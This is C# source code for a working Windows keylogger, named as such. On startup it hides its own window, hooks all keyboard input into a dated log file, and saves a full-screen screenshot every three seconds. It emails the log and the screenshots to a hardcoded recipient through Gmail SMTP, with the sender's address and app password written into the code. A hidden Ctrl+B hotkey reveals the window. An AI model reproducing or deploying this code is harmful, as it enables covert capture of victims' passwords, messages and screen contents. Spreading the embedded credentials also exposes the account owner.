using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net.Mail;
using System.Reflection.Emit;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace KeyLogger
{
    public partial class FKeyLogger : Form
    {
        GlobalKeyboardHook gHook;

        private static int Time_Capture = 3000;

        private List<int> Text_Array = new List<int>();

        private static string From_Mail = "keyloggerad123@gmail.com";

        private static string From_Mail_Pass = "kmnvxtgmeultvmnn";

        private static string To_Mail = "keyhung380@gmail.com";

        private static Thread thread_Capture;
        public FKeyLogger()
        {
            InitializeComponent();
            SetForm();
        }

        public void SetForm()
        {
            textBox1.ReadOnly = true;
            textBox_TimeCaptureScreen.Text = Time_Capture.ToString();
            textBox_ToMail.Text = To_Mail;
        }

        private void FKeyLogger_Load(object sender, EventArgs e)
        {
            this.Hide();

            gHook = new GlobalKeyboardHook();
            gHook.hook();
            gHook.KeyDown += new KeyEventHandler(GHook_KeyDown);
            foreach (Keys key in Enum.GetValues(typeof(Keys)))
            {
                gHook.HookedKeys.Add(key);
            }
            Start_CaptureScreen(Time_Capture);

        }

        private void GHook_KeyDown(object sender, KeyEventArgs e)
        {
            CheckHotKey((int)(Keys)e.KeyValue);
            string textKey = "";
            Text_Array.Add((int)(Keys)e.KeyValue);
            switch (((Keys)e.KeyValue).ToString())
            {
                case "LMenu": textKey = "[LMenu]"; break;

                case "LControlKey": textKey = "[LControlKey]"; break;

                case "LShiftKey": textKey = "[LShiftKey]"; break;

                case "LWin": textKey = "[LWin]"; break;

                case "Back": textKey = "[Back]"; break;

                case "Packet": textKey = "[Packet]"; break;

                case "Capital": textKey = "[Capital]"; break;
                    
                case "Return": textKey = "[Return]"; break;

                case "RMenu": textKey = "[RMenu]"; break;

                case "RControlKey": textKey = "[RControlKey]"; break;

                case "RShiftKey": textKey = "[RShiftKey]"; break;

                case "RWin": textKey = "[RWin]"; break;

                case "Space": textKey = "[Space]"; break;

                case "Oemcomma": textKey = "[Oemcomma]"; break;

                case "OemPeriod": textKey = "[OemPeriod]"; break;

                case "Oem1": textKey = "[OemPeriod]"; break;

                case "Oem7":textKey = "[OemPeriod]"; break;

                default: textKey = ((Keys)e.KeyValue).ToString(); break;

            }

            textBox1.Text += textKey;
            WriteToFile(textKey);
        }

        private void button_Exit_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void button_Hide_Click(object sender, EventArgs e)
        {
            this.Hide();
        }

        private void button_Save_Click(object sender, EventArgs e)
        {

        }

        public void WriteToFile(string textKey)
        {
            string logNameToWrite = "Keylogger - " + DateTime.Now.ToLongDateString() + ".txt";
            StreamWriter sw = new StreamWriter(logNameToWrite, true);
            sw.Write(textKey);
            sw.Close();
        }

        private static bool check = false;
        private static Keys previoursKey = Keys.Separator;
        public void CheckHotKey(int vkCode)
        {
            if ((previoursKey == Keys.LControlKey || previoursKey == Keys.RControlKey) && (Keys)(vkCode) == Keys.B)
            {
                check = true;
            }

            if (check == true)
            {
                check= false;
                this.Show();
            }
            previoursKey = (Keys)(vkCode);
        }

        public void Start_CaptureScreen(int Time_Capture)
        {
            if (thread_Capture != null)
            {
                thread_Capture.Abort();
            }

            bool run = true;
            if (Time_Capture == 0)
            {
                run = false;
            }

            Thread thread = new Thread(() =>
            {
                while (run)
                {
                    Thread.Sleep(Time_Capture);
                    CaptureScreen();
                }
            });
            thread_Capture = thread;

            thread_Capture.IsBackground = true;
            thread_Capture.Start();
        }

        private int imageCount = 0;
        public void CaptureScreen()
        {
            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                           Screen.PrimaryScreen.Bounds.Height,
                                           PixelFormat.Format32bppArgb);

            var gfxScreenshot = Graphics.FromImage(bmpScreenshot);

            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                                        Screen.PrimaryScreen.Bounds.Y,
                                        0,
                                        0,
                                        Screen.PrimaryScreen.Bounds.Size,
                                        CopyPixelOperation.SourceCopy);

            string directoryImage = "Keylogger - Image - " + DateTime.Now.ToLongDateString();

            if (!Directory.Exists(directoryImage))
            {
                Directory.CreateDirectory(directoryImage);
            }

            string imageName = string.Format("{0}\\{1}{2}", directoryImage, DateTime.Now.ToLongDateString() + imageCount, ".png");

            try
            {
                bmpScreenshot.Save(imageName, ImageFormat.Png);
            }
            catch
            {
            }
            imageCount++;
        }

        public void SendMail(string toMail)
        {
            try
            {
                MailMessage mail = new MailMessage();
                SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
                mail.From = new MailAddress(From_Mail);
                mail.To.Add(toMail);
                mail.Subject = "Keylogger: " + DateTime.Now.ToLongDateString();
                mail.Body = "Admin :\n";

                string logFile = "Keylogger - " + DateTime.Now.ToLongDateString() + ".txt";

                if (File.Exists(logFile))
                {
                    StreamReader sr = new StreamReader(logFile);

                    mail.Body += sr.ReadToEnd();

                    sr.Close();
                }

                string directoryImage = "Keylogger - Image - " + DateTime.Now.ToLongDateString();
                DirectoryInfo image = new DirectoryInfo(directoryImage);

                foreach (FileInfo item in image.GetFiles("*.png"))
                {
                    if (File.Exists(directoryImage + "\\" + item.Name))
                        mail.Attachments.Add(new Attachment(directoryImage + "\\" + item.Name));
                }

                SmtpServer.Port = 587;
                SmtpServer.Credentials = new System.Net.NetworkCredential(From_Mail, From_Mail_Pass);
                SmtpServer.EnableSsl = true;

                SmtpServer.Send(mail);

            }
            catch
            {
            }
        }

        private void button_StopCS_Click(object sender, EventArgs e)
        {
            textBox_TimeCaptureScreen.Text = "0";
            Time_Capture = 0;
            thread_Capture.Abort();

        }

        private void button_CaptureScreen_Click(object sender, EventArgs e)
        {
            int Time = Convert.ToInt32(textBox_TimeCaptureScreen.Text);
            Start_CaptureScreen(Time);

        }

        private void button1_Click(object sender, EventArgs e)
        {
            SendMail(textBox_ToMail.Text.ToString().Trim());
        }


        private void button_Clean_Click(object sender, EventArgs e)
        {
            textBox1.Text = "";
            Text_Array.Clear();
        }

        private void button_Filter_Click(object sender, EventArgs e)
        {
            textBox1.Text = "";
            foreach (int str in Text_Array)
            {
                textBox1.Text += ((char)str).ToString();   

            }

        }

        private void FKeyLogger_Shown(object sender, EventArgs e)
        {
            this.Hide();
        }
    }
}
